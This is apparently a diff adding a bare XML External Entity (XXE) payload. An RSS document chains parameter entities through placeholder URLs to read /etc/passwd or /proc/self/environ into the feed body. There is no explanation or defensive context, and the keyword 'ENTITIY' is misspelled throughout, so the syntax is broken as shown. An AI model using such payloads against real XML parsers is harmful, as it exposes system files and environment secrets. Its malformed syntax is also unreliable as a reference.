@@ -1,0 +1,19 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE rss[
+  <!ENTITIY % dtd SYSTEM "url_1">%dtd;%dts;%step
+]>
+<rss>
+&file;
+</rss>
+
+
+@ url_1
+<!ENTITIY % dts SYSTEM "url_2">
+
+@ url_2
+<!ENTITIY % step SYSTEM "malicious">
+
+@ malicious
+<!ENTITIY file SYSTEM "file:///etc/passwd">
+or
+<!ENTITIY file SYSTEM "file:///proc/self/environ">
